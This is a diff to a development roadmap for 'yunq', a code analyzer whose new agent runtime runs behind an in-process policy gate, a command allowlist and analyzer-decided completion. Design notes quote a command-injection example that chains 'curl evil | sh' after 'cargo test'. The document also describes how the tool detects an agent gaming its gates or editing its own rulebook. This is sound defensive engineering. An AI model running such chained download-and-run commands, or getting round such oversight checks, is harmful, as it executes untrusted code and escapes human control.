@@ -24,7 +24,7 @@ third-party agent today, and no task is reported complete without the
 analyzer agreeing. The referee becomes a player without ever stopping being
 the referee.
 
-## Where we actually are (2026-07-29)
+## Where we actually are (2026-07-30)
 
 Verified against the tree, not remembered:
 
@@ -37,19 +37,22 @@ Verified against the tree, not remembered:
 | Analysis core | `rules-engine`, `ast`, `profiles`, `taint` (intra + cross-file), `duplication`, `symbols`, `import-graph`, `crap` (CC² × (1−coverage)³ + CC risk scoring) |
 | Agent guardrail | `core/agent-policy` (1039 LOC): blocking/advisory rules, protected paths (incl. its own policy/gate config files), provenance, Gherkin evidence, circuit breaker, loop guard, single-use escalation tokens, audit log, gate-gaming detection (suppressions, skipped tests) |
 | Guardrail host | `yunq hook {claude-code, check, install, approve, audit, reset-*}` — ~7ms p50 per write |
+| Agent runtime | `core/agent` (pure: session/tool loop, closed tool set, command allowlist, in-process write gate, analyzer-as-done, budget + repeat guard, PR-feedback watch) driven by `yunq agent {run, watch-pr}`; adapters in `infra/llm` (tool-calling chat), `infra/fs` (workspace), `infra/github` (PR feedback) |
 | Remediation | `core/remediation`: `RemediationEngine` over `LlmProvider` + `Sandbox` ports, generate → sandbox → re-scan → verdict |
 | LLM adapters | `infra/llm`: Anthropic Messages API + OpenAI-compatible (Groq/DeepSeek/Ollama/vLLM/LiteLLM) |
-| CLI | `scan`, `fix`, `hook`, `init`, `wizard` |
+| CLI | `scan`, `fix`, `hook`, `agent`, `init`, `wizard` |
 | Coverage ingest | LCOV, Cobertura, JaCoCo, llvm-cov, Istanbul — with per-line hit detail (`FileLineCoverage`) |
 | ALM adapters | GitHub, GitLab, Bitbucket, Azure DevOps |
 | CI | `.github/workflows/ci.yml` — tests, clippy, benchmark regression gate (10% throughput drop fails), mutation gate |
 | Performance | **~67.6k LOC/s** measured floor on a throttled runner; target ≥100k. The "~398k LOC/s" figure that circulated earlier is retracted — no harness ever produced it |
 | Hosted layer | `yunq-cloud`, private repo (API server, worker, Postgres, frontend) — out of scope here |
 
-**The honest gap:** yunq can judge an edit in 7ms and cannot make one. `yunq
-fix` proposes a single-issue patch and stops. There is no session, no tool
-loop, no task decomposition, no multi-file change, no orchestration. That gap
-is workstream A.
+**The gap as of 2026-07-29 — now closed except for the TUI:** yunq could
+judge an edit in 7ms and could not make one. `yunq fix` proposed a
+single-issue patch and stopped. A1–A5 shipped on 2026-07-30: there is now a
+session, a tool loop, multi-file change, an in-process policy gate and an
+analyzer-decided definition of done. What is left in workstream A is A6 (the
+TUI), which was always last.
 
 ---
 
@@ -68,51 +71,65 @@ Forking would buy a session loop and pay for it with a permanent rebase tax
 against an upstream steering somewhere else entirely. Read it for its
 workspace-isolation and pairing design; write our own runtime.
 
-New crate `bin/agent` (composition root) plus whatever pure logic it needs in
-`core/agent` — the split follows the existing rule: the loop's decision logic
-is pure and unit-testable, the I/O is the binary's problem.
+Pure logic in `core/agent`, composition root in `bin/cli`'s `agent` module —
+the split follows the existing rule (the loop's decision logic is pure and
+unit-testable, the I/O is the binary's problem), with one change from the
+original plan. The composition root is *not* a new `bin/agent` crate. Every
+adapter A2 needs — the policy loader, the provenance ledger, the Gherkin
+index, the approval store, the persisted circuit breaker, the audit log, the
+whole-workspace `AnalyzerService` — already exists in `bin/cli`, and a
+separate binary could only reach them by depending on `bin/cli` (making
+`yunq agent` a second executable, contradicting A6's `yunq agent run --task`)
+or by duplicating them (contradicting A2's entire point). One binary, one
+enforcement engine.
 
-- **A1 — Session + tool loop.** The missing primitive. A conversation with an
-  `LlmProvider`, a tool registry, and a turn loop that terminates. Tools ship
-  as a closed, declared set (`read`, `write`, `edit`, `search`, `run`,
-  `scan`), never an open shell passthrough. `Sandbox` (already a port) is how
-  `run` executes.
-- **A2 — Policy as the referee, in-process.** `yunq hook` pays ~7ms of
-  process startup per write because a third-party host has no other way in.
-  Our own agent has no such excuse: `AgentPolicy::evaluate` runs in-process,
-  on the proposed content, before the write syscall. Same policy file, same
-  causes, same circuit breaker, same audit log — a `yunq-policy.toml` written
-  for Claude Code governs `yunq agent` unchanged. This is the feature. An
-  agent that shares an enforcement engine with the CI gate cannot drift from
-  it.
-- **A3 — Analyzer as the definition of done.** A task is complete when the
-  embedded `AnalyzerService` says the intended issue is gone and no new
-  issue appeared — the `RemediationEngine` verdict logic, lifted from
-  single-issue scope to task scope. No self-assessment turn, ever.
-- **A4 — Cost and termination.** The circuit breaker (3 consecutive denials
-  per rule) and loop guard already exist for hook callers and become the
-  agent's own stopping conditions. Add a token/turn budget with an explicit
-  exhaustion verdict. A runtime that can burn an unbounded budget against the
-  same wall is not shippable.
-- **A5 — Late feedback is part of done.** A3 defines "done" as the analyzer
-  agreeing, which is true right up until the agent opens a PR — at which
-  point review bots and CI post minutes after the push, and a PR that looked
-  clean the instant it was pushed is not a PR that is finished. The agent
-  needs to wait out that window rather than declaring victory into it: a
-  backoff schedule, a settle window so one review batch is collected as one
-  batch, and a ledger of already-triaged items so a re-run does not
-  re-report what it already handled. Four terminal states, not two — quiet,
-  new feedback, bot all-clear, and **inconclusive**. That last one carries
-  the weight: "we looked and saw nothing" and "we could not look" must never
-  collapse into the same exit code, which is the same discipline the rest of
-  the codebase's fail-open behaviour needs everywhere. Fail-open must not
-  mean fail-blind. Every ALM API call is status-checked on the way in for
-  the same reason: error bodies arrive on the same channel as data, so an
-  unchecked call reports a rate-limit page as findings. Lives in
-  `infra/github` with the other ALM adapters.
-- **A6 — TUI.** Last, deliberately. A headless `yunq agent run --task` that
-  is scriptable and CI-usable is worth more than a chat interface, and it is
-  what the swarm in workstream B drives.
+- **A1 — Session + tool loop. Shipped.** `core/agent::{session, tools,
+  runtime}`. A transcript, a closed tool set (`read`, `write`, `edit`,
+  `search`, `run`, `scan`) as a Rust enum — an unrecognised name comes back
+  to the model as "no such tool", never routed — and a turn loop that
+  terminates in one of six states. `run` is narrowed twice: a
+  `CommandAllowlist` of programs, plus rejection of every shell
+  metacharacter, so `cargo test; curl evil | sh` cannot pass a check that
+  only reads the first word. Execution goes through the `Workspace` port
+  (`infra/fs::RepoWorkspace`: root-confined path resolution, killed on
+  timeout) rather than `Sandbox`, whose apply/read/rollback shape is a
+  remediation contract with no way to run a command.
+- **A2 — Policy as the referee, in-process. Shipped.** `HookWriteJudge` calls
+  the same `hook::judge` a third-party agent's write goes through, then the
+  same `track_circuit_breaker`, `track_loop_guard` and `append_audit_log`.
+  Not a second implementation of the guardrail — the same functions. The
+  runtime's own invariant is structural: `AgentRuntime::apply_write` is the
+  only function holding both a `Workspace` and a `WriteJudge`, so there is no
+  route to disk that skips the evaluation, and a judge that *fails* stops the
+  run rather than letting an unjudged write through.
+- **A3 — Analyzer as the definition of done. Shipped.**
+  `core/agent::completion`. `RemediationEngine`'s verdict lifted to task
+  scope, with two changes the wider scope forces: the comparison is against a
+  baseline taken before the run (not against zero — a real repository has
+  findings the task is not about), and a finding's identity is
+  `(file, rule, message)` as a multiset, so an edit that moves a line is not
+  a regression while a *second* copy of an existing finding is. When the
+  model stops calling tools the analyzer re-runs and, if it disagrees, its
+  objection becomes the next user turn. No self-assessment turn, ever.
+- **A4 — Cost and termination. Shipped.** `core/agent::budget`. Turn and
+  token ceilings checked before each turn, each with its own verdict; the
+  circuit breaker and a session-scoped repeat guard as stopping conditions;
+  six terminal states with six distinct exit codes (0 complete, 3 incomplete,
+  4 budget, 5 breaker, 6 looping, 1 yunq failed), so a supervisor never has
+  to parse prose and "we could not check" never reads as success.
+- **A5 — Late feedback is part of done. Shipped.** `core/agent::feedback`
+  (pure: backoff, settle window, triage ledger, classification) plus
+  `infra/github::PullRequestFeedbackReader` and `yunq agent watch-pr`. Four
+  terminal states — quiet, new feedback, bot all-clear, **inconclusive** —
+  and the last one is load-bearing: a window that ends after a failed poll,
+  or with a check still running, reports inconclusive rather than quiet.
+  Fail-open must not mean fail-blind. Every ALM call is status-checked before
+  its body is deserialised, because a rate-limit page parses into an empty
+  list and an empty list reads as silence.
+- **A6 — TUI.** Last, deliberately, and the only part of A still open. A
+  headless `yunq agent run --task` that is scriptable and CI-usable is worth
+  more than a chat interface, and it is what the swarm in workstream B
+  drives.
 
 **Non-goal:** yunq agent is not a general assistant. No chat channels, no
 plugins, no MCP client. It edits repositories under a policy.
@@ -581,6 +598,9 @@ target.
 | CRAP before any new coverage work | Both inputs already exist and have never been multiplied. Highest ratio of signal to new code on the roadmap. |
 | Architecture rules emit ordinary `Issue`s | Free reuse of gates, SARIF, PR decoration, and — critically — the agent policy, so a boundary violation is denied at write time rather than reported after merge. |
 | Gates are values, not instructions | Surveying the agent-workflow ecosystem (e.g. `theam/claude-dev-kit`, Apache-2.0 — a ~2500-line Claude Code plugin) shows the state of the art enforcing gates by *asking*: "never report a gate as passed without having run it" is a prompt line a model can violate silently. yunq is the one project positioned to make that structurally true, because the judge is a separate deterministic artifact. Learn the pipeline shape from such kits; do not adopt their enforcement architecture. |
+| `yunq agent` is a subcommand of the one binary, not a second one | The original plan said "new crate `bin/agent`". Every adapter the in-process gate needs already lives in `bin/cli` (policy loader, provenance ledger, Gherkin index, approvals, persisted breaker, audit log, composed `AnalyzerService`). A separate binary could only reach them by depending on `bin/cli` — which makes `yunq agent run` a different executable than the `yunq` on PATH — or by reimplementing them, which is exactly the drift A2 exists to prevent. |
+| `run` has an allowlist *and* rejects shell metacharacters | An allowlist that only inspects the first word is not an allowlist: `cargo test; curl evil.sh \| sh` passes it. This is the one tool whose side effect the policy gate never sees, so it is narrowed twice. |
+| A finding's cross-run identity excludes its line number | Line numbers move the moment anything above them changes. Identity by `(file, rule, message)` — counted as a multiset, so a duplicate is still a regression — is what makes "the agent introduced nothing new" mean anything after a real edit. |
 | The policy file is itself a protected path | The highest-leverage move for anything optimising to make a write land is editing the rulebook, not the code. |
 | Reimplement borrowed designs; do not vendor them | Useful prior art in this space is largely Apache-2.0 while yunq is MIT. Apache's attribution/NOTICE/patent terms travel with copied source; behaviour learned from reading it does not. |
 | ROADMAP split from DEVLOG | 1280 lines of session narrative made the plan unfindable. The rationale is worth keeping; it just is not a plan. |
@@ -591,16 +611,16 @@ target.
 done ──► E4–E5 (gate-gaming)
          C1–C3 (CRAP)
          D1–D2 (boundaries)
+         E1    (mutation widen, through yunq-cpd)
+         A1–A5 (agent runtime core + PR feedback loop)
 
-now  ──► E1  (mutation widen) — startable immediately, untouched by D or A/B
-
-then ─► A1–A4 (agent runtime core) ─► A5 (PR feedback loop) ─► A6 (TUI)
-                │
-                └─► B1–B4 (swarm)  [needs headless A]
+now  ──► B1–B4 (swarm)  [unblocked: `yunq agent run` is headless]
+         A6    (TUI) — last in A, and nothing depends on it
 
 parallel ─► F (performance)  — continuous, gated in CI
-            C4 (run coverage) — now startable, C1–C3 shipped
-            D3–D4 (I/A + arch view) — now startable, D1–D2 shipped
+            C4 (run coverage) — startable, C1–C3 shipped
+            D3–D4 (I/A + arch view) — startable, D1–D2 shipped
+            E1 (further widening: taint → rules-engine) — more matrix entries
             G — opportunistic
 ```
 
@@ -611,11 +631,22 @@ next — cheapest high-value item, both inputs already existed. D1–D2
 (boundaries) shipped next — components fall out of the same directory
 topology the workspace already enforces via Cargo, and a violation reuses
 every pipeline CRAP's findings already flow through, so the whole feature
-added one config table and one cross-file rule. E1 (mutation widen) is what's
-left in that original group, still untouched by anything D or A/B does. A is
-the long pole and everything in B depends on A running headless. F is
-continuous and already gated. D3–D4 (I/A metrics, `yunq arch` viewer) can
-start now that D1's component model exists.
+added one config table and one cross-file rule.
+
+A1–A5 shipped next, in one pass rather than four, because A2 is the reason
+the workstream exists and the other three are only interesting once it holds:
+a session loop without the gate is a worse version of every agent already on
+the market. A5 came along with them because "done" is not a claim you can
+make about a pull request the instant you push it. A6 (TUI) is deliberately
+still open — it is the one part of A that buys nothing the swarm needs.
+
+B is now unblocked: `yunq agent run --task` is headless, scriptable and
+returns a structured outcome, which is exactly the interface B4's topologies
+drive. F is continuous and already gated. D3–D4 (I/A metrics, `yunq arch`
+viewer) can start now that D1's component model exists. E1's remaining
+widening (taint → rules-engine) is more matrix entries, and `core/agent` is
+the obvious next admission to it: it is pure, fast, and the highest-
+consequence decision logic added since `core/agent-policy` itself.
 
 ## Non-goals
 
